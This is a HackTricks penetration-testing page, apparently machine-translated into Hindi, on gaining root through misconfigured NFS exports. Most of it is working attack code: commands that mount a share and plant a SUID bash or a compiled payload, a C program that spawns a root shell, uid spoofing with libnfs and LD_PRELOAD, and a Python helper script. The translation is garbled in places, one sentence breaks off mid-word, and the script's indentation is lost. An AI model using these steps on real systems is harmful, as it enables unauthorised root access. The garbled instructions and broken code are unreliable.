<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी कंपनी का विज्ञापन **HackTricks** में देखना चाहते हैं या **HackTricks को PDF में डाउनलोड** करना चाहते हैं तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **मुझे** **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)** का पालन करें।**
* **अपने हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>


_ **/etc/exports** _ फ़ाइल पढ़ें, यदि आपको कोई ऐसी डायरेक्टरी मिलती है जो **no\_root\_squash** के रूप में कॉन्फ़िगर की गई है, तो आप उसे **एक क्लाइंट के रूप में एक्सेस** कर सकते हैं और उस डायरेक्टरी में **लिख सकते हैं** जैसे कि आप मशीन के स्थानीय **रूट** हो।

**no\_root\_squash**: यह विकल्प मूल रूप से यह अधिकार देता है कि क्लाइंट पर रूट उपयोगकर्ता को NFS सर्वर पर फ़ाइलों तक पहुँचने की अनुमति है। और इससे गंभीर सुरक्षा संबंधित परिणाम हो सकते हैं।

**no\_all\_squash:** यह **no\_root\_squash** विकल्प के समान है लेकिन यह **गैर-रूट उपयोगकर्ताओं** के लिए लागू होता है। कल्पना करें, आपके पास कोई उपयोगकर्ता नहीं है; /etc/exports फ़ाइल देखी; no\_all\_squash विकल्प मौजूद है; /etc/passwd फ़ाइल देखी; गैर-रूट उपयोगकर्ता के रूप में एम्युलेट करें; उस उपयोगकर्ता के रूप में एक suid फ़ाइल बनाएं (NFS का उपयोग करके माउंट करके)। उस suid को नोबडी उपयोगकर्ता के रूप में एक्सीक्यूट करें और विभिन्न उपयोगकर्ता बनें।

# विशेषाधिकार उन्नति

## रिमोट एक्सप्लॉइट

यदि आपने इस भयंकरता को पाया है, तो आप इसे एक्सप्लॉइट कर सकते हैं:

* **उस डायरेक्टरी को माउंट करना** एक क्लाइंट मशीन में, और **रूट के रूप में** माउंट किए गए फ़ोल्डर में **/bin/bash** बाइनरी कॉपी करना और इसे **SUID** अधिकार देना, और **विक्टिम** मशीन से उस बैश बाइनरी को एक्सीक्यूट करना।
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **उस निर्देशिका को माउंट करें** एक क्लाइंट मशीन में, और **रूट के रूप में कॉपी करें** माउंट किए गए फ़ोल्डर में हमारा कंपाइल किया गया पेलोड जो SUID अनुमति का दुरुपयोग करेगा, उसे **SUID** अधिकार दें, और **विक्टिम** मशीन से उस बाइनरी को चलाएं (आप यहाँ कुछ [सी SUID पेलोड](payloads-to-execute.md#c) पा सकते हैं)।
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## स्थानीय उत्कृष्टि

{% hint style="info" %}
ध्यान दें कि यदि आप अपनी मशीन से पीड़ित मशीन तक एक **टनल बना सकते हैं तो आप इस उत्कृष्टि उन्नयन का रिमोट संस्करण उपयोग कर सकते हैं जिसमें आवश्यक पोर्ट्स को टनल किया जाता है**।\
निम्नलिखित ट्रिक उस स्थिति के लिए है जब फ़ाइल `/etc/exports` **एक आईपी इंडिकेट करती है**। इस मामले में आप **किसी भी स्थिति में रिमोट उत्कृष्टि का उपयोग नहीं कर सकेंगे** और आपको **इस ट्रिक का दुरुपयोग करने की आवश्यकता होगी**।\
उत्कृष्टि काम करने के लिए एक और आवश्यक शर्त यह है कि **`/etc/export` के भीतर निर्यात** **`insecure` ध्वज का उपयोग कर रहा हो**।\
\--_मुझे यकीन नहीं है कि यदि `/etc/export` एक आईपी पता इंडिकेट कर रहा है तो यह ट्रिक काम करेगी_--
{% endhint %}

## मौलिक जानकारी

स्थिति में एक माउंट किए गए NFS साझा का उत्कृष्टि करने का संबंध है, NFSv3 विनिर्देश में एक दोष का उपयोग करना जिससे ग्राहक अपना यूआईडी/जीआईडी निर्दिष्ट कर सकता है, संभावित अनधिकृत पहुंच सक्षम कर सकता है। उत्कृष्टि [libnfs](https://github.com/sahlberg/libnfs) का उपयोग करने को शामिल करता है, एक पुस्तकालय जो NFS RPC कॉल्स का झूठा बनाने की अनुमति देता है।

### पुस्तकालय का संकलन

पुस्तकालय के संकलन चरणों में कर्नेल संस्करण के आधार पर समायोजन की आवश्यकता हो सकती है। इस विशेष मामले में, fallocate सिसकॉल्स को टिप्पणी किया गया था। संकलन प्रक्रिया निम्नलिखित आदेशों को शामिल करती है:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### क्रियान्वयन करना

यह उत्पीड़न एक सरल सी प्रोग्राम (`pwn.c`) बनाने का सम्मिलित करता है जो विशेषाधिकारों को जड़ देता है और फिर एक शैल का क्रियान्वयन करता है। प्रोग्राम को कॉम्पाइल किया जाता है, और परिणामी बाइनरी (`a.out`) को शेयर पर सुइड रूट के साथ रखा जाता है, `ld_nfs.so` का उपयोग करके RPC कॉल में uid को फर्ज करने के लिए:

1. **उत्पीड़न कोड को कॉम्पाइल करें:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **उत्पीड़न को शेयर पर रखें और uid को फर्ज करके इसकी अनुमतियों को संशोधित करें:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **रूट विशेषाधिकार प्राप्त करने के लिए उत्पीड़न को क्रियान्वित करें:**
```bash
/mnt/share/a.out
#root
```

## बोनस: NFShell के लिए छिपीली फ़ाइल एक्सेस
एक बार रूट एक्सेस प्राप्त किया जाता है, नाम स्वामित्व बदलने के बिना NFS शेयर के साथ बातचीत करने के लिए, एक पायथन स्क्रिप्ट (nfsh.py) का उपयोग किया जाता है। यह स्क्रिप्ट उस फ़ाइल के uid को समान करने के लिए uid को समायोजित करता है, जिसका उपयोग अनुमत
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
इस तरह से चलाएं:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
# संदर्भ
* [https://www.errno.fr/nfs_privesc.html](https://www.errno.fr/nfs_privesc.html)


<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सदस्यता योजनाएं देखें**](https://github.com/sponsors/carlospolop)!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह **The PEASS Family** की खोज करें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **मुझे** **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें द्वारा PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>
